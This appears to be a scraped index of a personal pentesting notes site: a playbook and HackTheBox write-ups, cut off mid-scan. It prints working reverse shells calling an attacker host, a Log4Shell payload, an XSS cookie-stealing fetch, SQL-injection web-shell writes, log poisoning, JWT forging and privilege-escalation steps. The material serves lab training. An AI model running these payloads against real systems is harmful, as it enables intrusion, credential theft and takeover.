website by reading the HTTP response headers, etc...  └─$ whatweb https://github.com/urbanadventurer/WhatWeb https://github.com/urbanadventurer/WhatWeb [200 OK] Cookies[_gh_sess,_octo,logged_in], Country[UNITED STATES][US], Email[banner@2x.png,nk@dsigned.gr,snoo-home@2x.png], HTML5, HTTPServer[GitHub.com], HttpOnly[_gh_sess,logged_in], IP[140.82.121.3], Open-Graph-Protocol[object][1401488693436528], OpenSearch[/opensearch.xml], PoweredBy[WordPress,[PHP/5,[phpBB],,abc,abc\\,abc\\&amp;quot;,phpBB,phpBB&amp;quot;], Script[application/javascript,application/json], Strict-Transport-Security[max-age=31536000; includeSubdomains; preload], Title[GitHub - urbanadventurer/WhatWeb: Next generation web scanner], UncommonHeaders[x-content-type-options,referrer-policy,content-security-policy,x-github-request-id], probably WordPress, X-Frame-Options[deny], X-XSS-Protection[0]   ","version":"Next","tagName":"h3"},{"title":"SMB enumeration​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#smb-enumeration","content":" If nmap show the Sambda related ports, you can try to enumerate the Sambda shared and check if they can be accessed anonimously.  smbclient -L \\\\&lt;ip&gt; -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC WorkShares Disk SMB1 disabled -- no workgroup available   Check smbclient for refenrece  ","version":"Next","tagName":"h3"},{"title":"Breaking in​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#breaking-in","content":" This stage is the most varied one, the idea is to find a vulnerability to get to a shell into the machine.  At this point, you should have a list of services (and versions) that are running in the machine. You can do a google query with the service you want to discover vulnerabilities.  The attack vector is different to each machine, here you can find most common vector attacks  ","version":"Next","tagName":"h2"},{"title":"Anonymous access​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#anonymous-access","content":" The user might have ftp or tftp or smb shares with anonymous access. It's worth taking a look because those access might leak some valuable information. Additionally, you can also check metasploit to check for this kind of access.  ","version":"Next","tagName":"h3"},{"title":"Guess/Brute force credentials​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#guessbrute-force-credentials","content":" If you discover a login page, why not trying some default user/password combinations? Try the following user/password combinations first:  admin:adminadministrator:administratoradmin:administratoradmin:passwordadministrator:password...  If you are login to a third-party applications it's wise to do a google search for default credentials.  You can try a dictionary attack to bruce force user/password combinations.  You can use a tool like thc-hydra. However, this will fail if there if there's any kind of CSRF protection.  ","version":"Next","tagName":"h3"},{"title":"SQL Injection​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#sql-injection","content":" Poorly programmed queries can be very dangerous and leads to escaping issues in the queries.  If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.  A typical SQL query for a login page can look like this:  SELECT * FROM members WHERE username = 'admin' AND password = 'admin'   If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:  SELECT * FROM members WHERE username = 'admin' #' AND password = 'kjdfjklsdf'   Now the query becomes:  SELECT * FROM members WHERE username = 'admin'   therefore, the query is no longer checking for password and the login page is bypassed.  Pay attention when breaking the rest of the query with comments. The standard comment -- might not always work, it's worth trying another kind of comments like #. Also, you might want to URL encode the escaping characters.  SQL injections reference: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet  ","version":"Next","tagName":"h3"},{"title":"Server side template injection (SSTI)​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#server-side-template-injection-ssti","content":" if you see a search form and you type something and you see the output of what you typed again in the webpage, the webpage might be susceptible for SSTI. Try to identify which template engine and search how to exploit it.  If the target is using a templating engine, it is possible to use the template injection to execute commands in the server.  One easy way to test that is to put something like {{7*7}} in the template and check for the result.  If the template executes, we'll see the result, out of luck we will see nothing. Or maybe we'll see some trace that reveals the technology behind.  ","version":"Next","tagName":"h3"},{"title":"Arbitrary file upload​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#arbitrary-file-upload","content":" This is a very interesting vulnerability. It lets the attacker upload some file to the server. You can do this to start a reverse shell. That is the targeted machine establish a permanent connection to the attacker machine and it provides a shell where the attacker can run commands as if it was inside the machine.  ","version":"Next","tagName":"h3"},{"title":"File inclusion (LFI,RFI)​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#file-inclusion-lfirfi","content":" Some pages include other pages in order to improve re-usability, e.g. header and footer. If this is not configured properly, an attacker can use the include functionality to read local files.  http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts   You can try to read the following files for Linux:  /etc/hosts/etc/passwd  and for Windows:  C:/Windows/System32/drivers/etc/hostsc:/windows/win.ini  Depending on the inclusion it might lead to Remote File Inclusion, which is execute remote files.  This can be used for example to force the target make a call to a compromised host in the same network and capture the credentials challenge:  http://unika.htb/index.php?page=\\\\10.1.2.3\\blabla\\   ","version":"Next","tagName":"h3"},{"title":"Reverse shell ​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#reverse-shell-","content":" Reverse basically means that it is the target that will initiate a connection request back us (the attacker).  For example, once we have remote code execution in the target, we'll be able to download and execute a piece of code.  Usually the process is:  Create a file in the attacker machine containing a reverse shell payload:  #!/bin/bash bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP_ADDRESS&gt;/1337 0&gt;&amp;1   Create a server in the attacker machine which will act as the shell I/O. Normally this is done with netcat.  nc -nvlp 1337   Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):  python3 -m http.server 8000   Make the target machine download and execute the reverse shell payload:  http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash   You can find a list of reverse shells here: https://www.revshells.com/  Once you have shell access, most likely it will not be interactive and you'll miss many functionalities. You can try to get a improve the shell if python is installed:  python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' CTRL+Z stty raw -echo fg export TERM=xterm   Or, you can find mmore methods to improve the shell here https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/  ","version":"Next","tagName":"h3"},{"title":"Rogue servers ​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#rogue-servers-","content":" The idea of rogue server is to start a server in the attacker machine and make the target machine speak with the attacker server. This is used for instance to retrieve NTLM hash challenge or to explot log4j vulnerability.  NTLM ​  Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.  In order to mess with it, you might use the responder tool.  The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by responder tool). This tool will capture the authentication challenge hash and then you can use john tool to compare the hash with a dictionary to see if any entry matches.  Log4jShell ​  It was discovered that log4j libraries for certain versions were vulnerable to remote code execution. In order to do so, you setup a rogue JNDI/LDAP server from https://github.com/veracode-research/rogue-jndi in the attacker machine and send a JNDI command to the target machine to communicate with the rogue LDAP server to get a revershe shell on the attacker machine.  E.g.:  java -jar target/RogueJndi-1.1.jar --command &quot;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,- d}|{bash,-i}&quot; --hostname &quot;10.10.14.33&quot;   Start the rogue JNDI server that will start a reverse shell on 10.10.14.33 using the base64 payload provided.  Then, send the payload to force the target machine connect the rogue JNDI/LDAP server:  ${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}   ","version":"Next","tagName":"h3"},{"title":"XML eXternal Entities (XXE)​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#xml-external-entities-xxe","content":" If the application is using XML to process any input data, it might be vulnerable to this kind of attacks.  This attack works because the XML parsers usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.  In order to check if the machine is vulnerable to this attack, you can try to show the contents of /etc/hosts(Linux) or C:/Windows/System32/drivers/etc/hosts(Windows). e.g.:  &lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot; &gt;]&gt; &lt;order&gt;&lt;quantity&gt;2&lt;/quantity&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;address&gt;Fake street 1234&lt;/address&gt;&lt;/order&gt;   ","version":"Next","tagName":"h3"},{"title":"JWT Key confussion attack​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#jwt-key-confussion-attack","content":" JWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc...  They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.  This signing and verifing is very important because it ensures that nobody modifies the tokens.  However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we're using symmetric algorithm.  See the following example:  In the received side, the token is verified using symmetric and asymmetric algorithms:  async decode(token) { return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] })); }   First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.  This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:  const fs = require('fs'); const jwt = require('jsonwebtoken'); const publicKey = fs.readFileSync('./public.key', 'utf8'); const validJwtToken = fs.readFileSync('./jwt-token.txt', 'utf8'); decoded = jwt.verify(validJwtToken, publicKey, { algorithms: [&quot;RS256&quot;]}) decoded[&quot;username&quot;] = &quot;admin' AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage -- -&quot; re_encoded = jwt.sign(decoded, publicKey, {algorithm: 'HS256'}) console.log(re_encoded)   Here, we are using the public key to verify the received token, as the regular way.  Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the receiver will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.  In this case, we are modifying the token to retrieve something from the database using an SQL injection.  ","version":"Next","tagName":"h3"},{"title":"Cross-Site Scripting (XSS) ​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#cross-site-scripting-xss-","content":" This is a massive vulnerability. It consist on a web application accepting input from the user. If the input is not sanitized, the attacker might be able to write HTML in the input form. This HTML can include malicious javascript code.  Let's imagine we have an application with a form with no sanitized input. On another view we list that input. An attacker can place JS code that will be executed in the other view.  E.g.  Create a payload file that will send the interesting data (in our case, we want to extract something from the cookie):  fetch(&quot;https://ojm5l9c8.requestrepo.com/?&quot; + document.cookie);   Write the XSS HTML code in the input form field:  &lt;script src=https://cdn.jsdelivr.net/gh/adriangalera/htb-cursed-secret-party-xss@master/xss.js&gt;&lt;/script&gt;   In the remote url (requestrepo), you'll see the value of the document.cookie  There's a security header in modern browsers to prevent this Content Security Policy (CSP). However, if you are unlucky enough to include a CDN in that header, you are still vulnerable since one can put arbitrary code in the CDN.  ","version":"Next","tagName":"h3"},{"title":"Cookie hijacking​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#cookie-hijacking","content":" If you see the application has some cookies and you somehow got access to a privileged cookie, you just need to change it in your browser and you'll access as the privileged user.  ","version":"Next","tagName":"h3"},{"title":"Foothold, we are in​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#foothold-we-are-in","content":" At this point we have shell (or reverse) access to the target machine. Now we are in the machine, but we don't have much access, probably we're logged in as a user that can't do much and have access to few places.  ","version":"Next","tagName":"h2"},{"title":"List users and groups​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#list-users-and-groups","content":" We might discover other users of the machine.  In Linux, you can query all the available users in the target by querying /etc/passwd.  To retrieve the details about the current shell user, you can do id command. It will list the groups that the user belong. This might be useful for privilege escalation.  You can also list the binaries the user or group has access:  find / -group bugtracker 2&gt;/dev/null   ","version":"Next","tagName":"h3"},{"title":"Search for interesting keywords​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#search-for-interesting-keywords","content":" You can search inside the contents of files for interesting contents (passwords):  Let's image someone decided to hardcode a username/password in one file in a web server. You can find it checking the files one by one or, you can use grep to search all files for interesting keywords:  grep -Ril 'passwd*' /var/www/html   -R recursive-i ignore case-l show the file, not the match  ","version":"Next","tagName":"h3"},{"title":"Local port forwarding​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#local-port-forwarding","content":" Imagine you gain access to a machine which is running a service only for localhost. You can make that service available outside localhost by doing local port forwarding. e.g funnel.htb server is running postgres on port 5432.  With the next command, we'll do a SSH tunnel between localhost:5432 and funnel.htb:5432 port  ssh -L 5432:localhost:5432 christine@funnel.htb   and now you can access funnel.htb:5432 in localhost:5432  ","version":"Next","tagName":"h3"},{"title":"Lateral movement​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#lateral-movement","content":" Normally when the attacker get shell acess, the user has very few permissions. The attacker should check for credentials (inside database, inside files), etc... to switch from a low-permission user to a user with more permissions. That's called lateral movement and it's a step forward privilege escalation.  Also part of lateral movement is to use the machine as a pivot to enumerate more network devices. Typically this is done for enterprise level pentesting. Once a machine is compromised, you can access the machines in the same network even if they don't have public access.  Once we got shell access to a machine, it might be worth to try to retrieve the SSH private keys for the user. In order to do so, we must check the .ssh folder in the user home:  /home/michael/.ssh/id_rsac/users/daniel/.ssh/id_rsa  Paste the contents of that private key into the attacker machine and run:  chmod 400 michael-id-rsa ssh -i michael-id-rsa michael@target.htb   An interesting option for lateral movement is checking the values set in the environment variables:  5d711b9d670a:/metabase.db$ env env SHELL=/bin/sh MB_DB_PASS= HOSTNAME=5d711b9d670a LANGUAGE=en_US:en MB_JETTY_HOST=0.0.0.0 JAVA_HOME=/opt/java/openjdk MB_DB_FILE=//metabase.db/metabase.db PWD=/metabase.db LOGNAME=metabase MB_EMAIL_SMTP_USERNAME= HOME=/home/metabase LANG=en_US.UTF-8 META_USER=metalytics META_PASS=An4lytics_dsXXXX# MB_EMAIL_SMTP_PASSWORD= USER=metabase SHLVL=4 MB_DB_USER= FC_LANG=en-US LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib LC_CTYPE=en_US.UTF-8 MB_LDAP_BIND_DN= LC_ALL=en_US.UTF-8 MB_LDAP_PASSWORD= PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin MB_DB_CONNECTION_URI= JAVA_VERSION=jdk-11.0.19+7 _=/usr/bin/env OLDPWD=/   ","version":"Next","tagName":"h3"},{"title":"Privilege escalation​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#privilege-escalation","content":" This step is gaining access to the root or Administrator user of the machine. Once we do that, we can do whatever we want with that machine. The topic is very broad and this section only provides a summary of things to watch out.  ","version":"Next","tagName":"h2"},{"title":"Windows​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#windows","content":" You can use https://github.com/carlospolop/PEASS-ng. You need to run the executable file in the target Windows machine. The script will identify the possible vulnerabilities to exploit and gain admin access.  It might be possible that the password of the admin user has been pasted in the history of the shell. Check the output of winpeas for references to ConsoleHost_history.txt file.  Another interesting path to privilege escalation is to check the permissions of a file. In order to do so, run icacls command. (F) means Full access and is a promising way of privilege escalation.  ","version":"Next","tagName":"h3"},{"title":"Linux​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#linux","content":" You can check if the user can run sudo command and with which privileges or restrictions by running:  jack@clicker:~$ sudo -l Matching Defaults entries for jack on clicker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User jack may run the following commands on clicker: (ALL : ALL) ALL (root) SETENV: NOPASSWD: /opt/monitor.sh   NOPASSWD: means the user can execute the program without password as root.SETENV: means the user can set environment variables running the program as root.  SUID​  If you see some entry that allows the user to execute a binary as superuser you can check the file flags and permissions by running:  ls -lisa /usr/bin/bugtracker 264151 12 -rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker   The 's' in the result is the sticky bit in the file permissions.  file /usr/bin/bugtracker /usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped   The setuid permission is the sticky bit representation in the file command output.  That is a special permission named SUID or Set Owner User ID. SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user. That looks promising for privilede escalation.  In our case, the binary 'bugtracker' is owned by root &amp; we can execute it as root since it has SUID set.  If we execute the app, we can see that is asking for input. On invalid input it shows an error showing that it's using cat command:  robert@oopsie:/var/www/html$ bugtracker 12 bugtracker 12 ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 12 12 --------------- cat: /root/reports/12: No such file or directory   Looks like it's not using the full path of the cat tool. We can create a executable named cat and put it before in PATH and it will execute that cat (/tmp/cat) instead of the real cat:  echo &quot;/bin/sh&quot; &gt; /tmp/cat robert@oopsie:/var/www/html$ export PATH=/tmp:$PATH robert@oopsie:/var/www/html$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games robert@oopsie:/var/www/html$ bugtracker bugtracker ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 12 12 --------------- whoami root   and we have root access.  You can try to find all the files that has the suid flag set:  find / -perm -u=s -type f 2&gt;/dev/null   GTFObins​  If sudo -l shows permission for any binary, check https://gtfobins.github.io for a way to exploit the binary to gain root access.  E.g.: you can get root access with vim. If the user has sudo access to edit some file, you can abuse it to get root access:  vi :set shell=/bin/sh :shell   Check write access to PATH​  Check if you can write to some path in the PATH variable  import os paths = os.environ[&quot;PATH&quot;].split(&quot;:&quot;) for path in paths: writetable=True filename=f&quot;{path}/a&quot; try: with open(filename, &quot;w&quot;) as file1: file1.write(&quot;Hello&quot;) except Exception: writetable=False if writetable: os.system(f&quot;rm {filename}&quot;) print(path +&quot; ... &quot;+str(writetable))   Check open ports​  Might be interesting to what ports are listening in the server, you might find something vulnerable listening only in localhost for example.  netstat -tunap |grep &quot;LISTEN&quot;   Kernel version​  Search OS version and kernel for CVEs:  uname -a Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux   If we look in Google for 6.2.0-25-generic #25~22.04.2-Ubuntu CVE you'll see this link: https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability and this link https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629 ","version":"Next","tagName":"h3"},{"title":"telnet","type":0,"sectionRef":"#","url":"/docs/tooling/telnet","content":"telnet Telnet is a very old way of connecting to computer and by default listens on port 23. Usage: telnet &lt;ip&gt; The prompty will ask for user/password: telnet &lt;ip&gt; Trying &lt;ip&gt;... Connected to &lt;ip&gt;. Escape character is '^]'. █ █ ▐▌ ▄█▄ █ ▄▄▄▄ █▄▄█ ▀▀█ █▀▀ ▐▌▄▀ █ █▀█ █▀█ █▌▄█ ▄▀▀▄ ▀▄▀ █ █ █▄█ █▄▄ ▐█▀▄ █ █ █ █▄▄ █▌▄█ ▀▄▄▀ █▀█ Meow login: root ","keywords":"","version":"Next"},{"title":"Useful links","type":0,"sectionRef":"#","url":"/docs/useful-links","content":"Useful links Name\tDescription\tLinkpentestbook.six2dez.com\tGeneral guides on pentesting\thttps://pentestbook.six2dez.com/ revshells\tList of reverse shells\thttps://www.revshells.com Hacktricks\tUseful for everything related with pentesting\thttps://book.hacktricks.xyz/welcome/readme SecLists\tWordlists and stuff\thttps://github.com/danielmiessler/SecLists Reverse shells\tMore reverse shells payloads\thttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Pentestmonkey\tAnother pentesting guide\thttps://pentestmonkey.net/ GTFOBins\tList of UNIX binaries that can be used to bypass local security restrictions\thttps://gtfobins.github.io/ LOLbas\tSimilar to GTFObins but for Windows\thttps://lolbas-project.github.io/ Red team notes\tRed team notes\thttps://www.ired.team/ SQL injections\tSQL injections\thttps://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/ CVE mitre\tSearch for CVEs\thttps://cve.mitre.org/cve/search_cve_list.html Request repo\tTool to receive HTTP request and display data\thttps://requestrepo.com/ CTF 101\tCTF theory\thttps://ctf101.org/","keywords":"","version":"Next"},{"title":"File inclusion","type":0,"sectionRef":"#","url":"/docs/write-up/htb-academy/file-inclusion","content":"File inclusion This is the write-up for the assessment of HTB academy File inclusion module. This a little bit tricky because we know which vulnerability to exploit here: file inclusion. whatweb 94.237.49.11:31840/index.php http://94.237.49.11:31840/index.php [200 OK] Bootstrap, Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.18.0], IP[94.237.49.11], JQuery[3.3.1], PHP[7.3.22], Script, Title[InlaneFreight], X-Powered-By[PHP/7.3.22], nginx[1.18.0] whatweb reveals we're dealing with a PHP/7.3.22 page served by an nginx/1.18.0. While navigating as a regular user in the website, we can see the URL has a page parameter which looks promising for LFI vulnerability. Visiting http://94.237.49.11:31840/index.php?page=industries../ shows Invalid input detected! which is the contents of error.php page. Let's try the basic bypasses: Double the input: ./ become ..//. NothingURL encode the symbols: nothingTry to escape the approve path: N/A because the pages are in rootPath truncation: N/A PHP version is recentNull byte: N/A PHP version is recent Let's try with more complex bypasses: http://94.237.49.11:31840/index.php?page=php://filter/read=convert.base64-encode/resource=main Worked and return the content of the main.php in base64 In index.php we discover a commented piece of code that makes reference to ilf_admin/index.php. If we try to access that page, we get something interesting showing some logs. Worth remembering: http://94.237.49.11:31840/ilf_admin/index.php?log=system.log The filtering mechanism looks quite simple: $page = $_GET['page']; if (strpos($page, &quot;..&quot;) !== false) { include &quot;error.php&quot;; } else { include $page . &quot;.php&quot;; } http://94.237.49.11:31840/index.php?page=%252e%252e%252fetc%252fpasswd Looks like might be vulnerable to double encoding, however we're only bypassing the first if and the include only let us include php files. Let's get back to http://94.237.49.11:31840/ilf_admin/index.php We can try to brute-force some directories: ffuf -w /opt/github/SecLists/Discovery/Web-Content/combined_directories.txt:FUFF -u http://94.237.49.11:31840/ilf_admin/FUFF.php ffuf -w /opt/github/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.49.11:31840/ilf_admin/index.php?FUZZ=value' -fl 102 Nothing revealed. However, we can try the LFI directly in the log paramter: http://94.237.49.11:31840/ilf_admin/index.php?log=../../error.php and it worked! http://94.237.49.11:31840/ilf_admin/index.php?log=../../../../../etc/passwd we have read the passwd file! In order to have Remote Code Excecution, let's try to see if we can have Remote File Inclusion and add our shell. We cannot include Remote files, checking the nginx error log, looks like they might be using file_get_contents or something like this. Given we have access to logs, we can poison them and force ilf_admin to execute them by setting the user-agent of curl: curl -s &quot;http://94.237.59.185:42603/index.php&quot; -A &quot;&lt;?php system($_GET['cmd']); ?&gt;&quot; And now we have a web shell running in the logs page: http://94.237.59.185:42603/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&amp;cmd=id From here we can move to a reverse shell","keywords":"","version":"Next"},{"title":"Getting started","type":0,"sectionRef":"#","url":"/docs/write-up/htb-academy/getting-started","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Getting started","url":"/docs/write-up/htb-academy/getting-started#enumeration","content":" The machine has open ports in 22 and 80  SSH banner: OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0  There's an apache webserver in 80:  PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Welcome to GetSimple! - gettingstarted |_http-server-header: Apache/2.4.41 (Ubuntu) | http-robots.txt: 1 disallowed entry |_/admin/   └──╼ $whatweb http://10.129.235.190/ http://10.129.235.190/ [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.235.190], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]   From the previous scans we can see it's using the GetSimple cms.  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Getting started","url":"/docs/write-up/htb-academy/getting-started#foothold","content":" We search the default credentials and admin:admin worked.  Checking the vulnerabilities for the CMS, I found this one https://www.exploit-db.com/exploits/51475.  Then, it's a matter of download the exploit, run it and configure a remote shell using nc:  nc -lvnp 4444   and launch the exploit:  python3 51475.py 10.129.235.190 / 10.10.15.50:4444 admin   And we have foothold onto the machine with www-data user:  nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.15.50] from (UNKNOWN) [10.129.235.190] 52682 id uid=33(www-data) gid=33(www-data) groups=33(www-data)   Now, we just need to improve the shell and retrieve the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Getting started","url":"/docs/write-up/htb-academy/getting-started#privilege-escalation","content":" Now, we can escalate privileges. First we check what root permissions have the user:  www-data@gettingstarted:/home/mrb3n$ sudo -l sudo -l Matching Defaults entries for www-data on gettingstarted: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on gettingstarted: (ALL : ALL) NOPASSWD: /usr/bin/php   The user www-data can execute the php binary as root without providing a password. This is a very bad idea. A quick search in GTFObins give a easy payload to get a root shell:  www-data@gettingstarted:/home/mrb3n$ sudo php -r 'system(&quot;/bin/sh&quot;);' sudo php -r 'system(&quot;/bin/sh&quot;);' id id uid=0(root) gid=0(root) groups=0(root)   Now we can retrieve the root flag. ","version":"Next","tagName":"h2"},{"title":"SQL injections","type":0,"sectionRef":"#","url":"/docs/write-up/htb-academy/sqli","content":"","keywords":"","version":"Next"},{"title":"Login page​","type":1,"pageTitle":"SQL injections","url":"/docs/write-up/htb-academy/sqli#login-page","content":" First of all we're given a login page, most likely we'll need to provide a SQLi to bypass the login.  Let's evaluate which fields are vulnerable to SQLi by providing a dangling character, e.g: ' to break the query.  curl -vvv 'http://83.136.251.235:30056/' -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=\\'&amp;password=1234'   We couldn't break any field with the escape characters. We can try some of the pre-defined SQL injections from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases.  The second one worked fine:  ' OR 1 -- -   and we're presented a dashboard with a search box.  ","version":"Next","tagName":"h2"},{"title":"Search box​","type":1,"pageTitle":"SQL injections","url":"/docs/write-up/htb-academy/sqli#search-box","content":" The search box make a request like:  curl 'http://83.136.251.235:30056/dashboard/dashboard.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=t7addrm0eidu7ag6m1e7e31geo' --data-raw 'search=a'   Looks like the search only works to search the values in the date.  We should follow the same approach: let's try to break the search with escape character: ' and it worked, we can see an error.  Let's try to determine the number of columns:  a' UNION SELECT 1,2,3,4 -- -   It shows: The used SELECT statements have a different number of columns  It worked with:  a' UNION SELECT 1,2,3,4,5 -- -   But the first column is not shown  The objective is to install a web-shell, so let's enumerate if we're capable of.  a' UNION SELECT 1,user(),3,4,5 -- -   and we got root@localhost  Let's check privileges:  a' UNION SELECT 1,grantee, privilege_type,4,5 FROM information_schema.user_privileges WHERE grantee=&quot;'root'@'localhost'&quot; -- -   FILE privilege is there.  Check for write file global var:  a' UNION SELECT 1,variable_name, variable_value,4,5 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot; -- -   The variable is not set, so we can write.  Let's try it:  a' UNION SELECT 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt' -- -   Now let's try to read it, before we try to install the shell.  a' UNION SELECT 1,LOAD_FILE('/var/www/html/dashboard/proof.txt'),3,4,5 -- -   We got the contents back, so let's install the shell.  a' UNION select &quot;&quot;,'&lt;?php system($_REQUEST[0]); ?&gt;', &quot;&quot;, &quot;&quot;, &quot;&quot; into outfile '/var/www/html/dashboard/1.php' -- -   And we've got the shell http://83.136.251.235:30056/dashboard/1.php?0=id  Now we list files at root: http://83.136.251.235:30056/dashboard/1.php?0=ls%20/  Now we can retrieve the flag: http://83.136.251.235:30056/dashboard/1.php?0=cat%20/flag_cae1dadcd174.txt ","version":"Next","tagName":"h2"},{"title":"Sau","type":0,"sectionRef":"#","url":"/docs/write-up/htb/easy/sau","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Sau","url":"/docs/write-up/htb/easy/sau#enumeration","content":" Initial scan shows some open ports:  └──╼ $nmap sau.htb -oA scans/initial_scan -Pn -n Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 19:10 BST Nmap scan report for sau.htb (10.10.11.224) Host is up (0.14s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp filtered http 55555/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 20.00 seconds   Port 80 is behind a firewall.  SSH:  └──╼ $nmap sau.htb -oA scans/ssh_scan -Pn -n -p22 -sC -sV Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 19:11 BST Nmap scan report for sau.htb (10.10.11.224) Host is up 